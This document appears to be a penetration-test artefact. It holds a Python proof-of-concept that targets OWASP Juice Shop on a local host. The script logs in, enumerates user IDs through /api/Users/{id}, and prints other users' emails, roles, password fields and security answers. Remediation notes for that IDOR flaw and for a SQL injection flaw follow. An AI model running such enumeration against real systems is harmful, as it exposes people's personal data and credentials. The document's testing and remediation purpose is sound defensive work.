import requests
import json

def test_idor_vulnerability(target_url, auth_token):
    """
    Test IDOR vulnerability in Juice Shop user API
    """
    headers = {
        "Authorization": f"Bearer {auth_token}",
        "Content-Type": "application/json"
    }

    # First, get current user's ID to establish baseline
    whoami_url = f"{target_url}/rest/user/whoami"
    try:
        response = requests.get(whoami_url, headers=headers, timeout=10)
        if response.status_code == 200:
            user_data = response.json()
            current_user_id = user_data.get('id')
            print(f"Current authenticated user ID: {current_user_id}")
        else:
            print(f"Failed to get current user info: {response.status_code}")
            current_user_id = None
    except Exception as e:
        print(f"Error getting current user: {e}")
        current_user_id = None

    # Test IDOR by accessing other user IDs
    vulnerable = False
    test_user_ids = [1, 2, 3, 10, 100]  # Test various IDs including likely admin (1)

    for user_id in test_user_ids:
        if current_user_id and user_id == current_user_id:
            continue  # Skip testing own ID

        api_url = f"{target_url}/api/Users/{user_id}"
        try:
            response = requests.get(api_url, headers=headers, timeout=10)

            if response.status_code == 200:
                user_data = response.json()
                print(f"\n[VULNERABLE] Successfully accessed user ID: {user_id}")
                print(f"  Email: {user_data.get('email', 'N/A')}")
                print(f"  Role: {user_data.get('role', 'N/A')}")

                # Check for sensitive data exposure
                sensitive_fields = ['password', 'securityQuestion', 'securityAnswer']
                for field in sensitive_fields:
                    if field in user_data:
                        print(f"  {field}: {user_data[field]}")

                vulnerable = True

            elif response.status_code == 403:
                print(f"\n[SECURE] Access denied for user ID: {user_id} (proper authorization)")
            elif response.status_code == 404:
                print(f"\n[INFO] User ID {user_id} not found")
            else:
                print(f"\n[UNEXPECTED] Status {response.status_code} for user ID: {user_id}")

        except Exception as e:
            print(f"\n[ERROR] Testing user ID {user_id}: {e}")

    return vulnerable

def get_auth_token(target_url, email, password):
    """
    Get authentication token for testing
    """
    login_url = f"{target_url}/rest/user/login"
    login_data = {
        "email": email,
        "password": password
    }

    try:
        response = requests.post(login_url, json=login_data, timeout=10)
        if response.status_code == 200:
            auth_data = response.json()
            token = auth_data.get('authentication', {}).get('token')
            if token:
                print(f"Successfully authenticated as: {email}")
                return token
            else:
                print("No token in response")
        else:
            print(f"Login failed: {response.status_code}")
    except Exception as e:
        print(f"Authentication error: {e}")

    return None

if __name__ == "__main__":
    TARGET = "http://host.docker.internal:3000"

    # For testing, you would need valid credentials
    # These are example credentials - actual testing requires valid user
    TEST_EMAIL = "user@example.com"
    TEST_PASSWORD = "password123"

    print(f"Testing IDOR vulnerability on {TARGET}")
    print("=" * 60)

    # Get authentication token
    auth_token = get_auth_token(TARGET, TEST_EMAIL, TEST_PASSWORD)

    if auth_token:
        print("\nTesting IDOR access to user data...")
        is_vulnerable = test_idor_vulnerability(TARGET, auth_token)

        print("\n" + "=" * 60)
        if is_vulnerable:
            print("VULNERABLE: IDOR vulnerability confirmed!")
            print("Users can access other users' data without authorization")
        else:
            print("NOT VULNERABLE: Proper authorization checks in place")
    else:
        print("Failed to authenticate. Cannot test IDOR without valid token.")

vuln-0003.remediation:
1. **Implement proper authorization checks**: Add server-side validation to ensure users can only access their own resources. Compare the authenticated user ID from the JWT token with the requested resource ID.

2. **Use indirect object references**: Replace direct object references (like user IDs) with indirect references that are mapped server-side.

3. **Implement access control middleware**: Create centralized authorization middleware that validates resource ownership before processing any request.

4. **Apply the principle of least privilege**: Ensure users only have access to resources necessary for their role and function.

5. **Use UUIDs instead of sequential IDs**: Replace predictable sequential IDs with random UUIDs to make enumeration more difficult (though this is not a complete fix - authorization checks are still essential).

6. **Regular security testing**: Include IDOR testing in security assessments and penetration tests.

7. **Implement proper error handling**: Return consistent error messages (e.g., "Access denied") without revealing whether a resource exists.

8. **Log unauthorized access attempts**: Monitor and alert on suspicious patterns of resource access.

Example code fix for Node.js/Express:
```javascript
// Vulnerable code
app.get('/api/Users/:id', authenticate, (req, res) => {
  const userId = req.params.id;
  User.findById(userId).then(user => {
    res.json(user); // No authorization check
  });
});

// Fixed code
app.get('/api/Users/:id', authenticate, (req, res) => {
  const requestedUserId = req.params.id;
  const authenticatedUserId = req.user.id; // From JWT

  // Authorization check
  if (requestedUserId !== authenticatedUserId) {
    return res.status(403).json({ error: 'Access denied' });
  }

  User.findById(requestedUserId).then(user => {
    res.json(user);
  });
});
```

Additional recommendations:
- Implement role-based access control (RBAC) for administrative functions
- Use API gateways with built-in authorization capabilities
- Conduct regular code reviews focusing on authorization logic
- Train developers on secure coding practices for access control

vuln-0004.remediation:
1. **Use parameterized queries**: Replace string concatenation with prepared statements or parameterized queries for all database interactions.

2. **Implement strict input validation**: Validate and sanitize all search input. Consider using an allow-list of safe characters for search terms.

3. **Apply output encoding**: Properly encode data before displaying it in search results to prevent XSS attacks as well.

4. **Implement proper error handling**: Use generic error messages that don't reveal SQL errors or database structure.

5. **Use ORM safely**: If using an ORM, ensure it's configured to use parameterized queries and avoid raw query methods for user input.

6. **Limit search capabilities**: Implement reasonable limits on search results and query complexity to prevent denial of service.

7. **Regular security testing**: Include SQL injection testing for all search and filter functionalities in security assessments.

8. **Use WAF as defense-in-depth**: Implement a Web Application Firewall to detect and block SQL injection attempts.

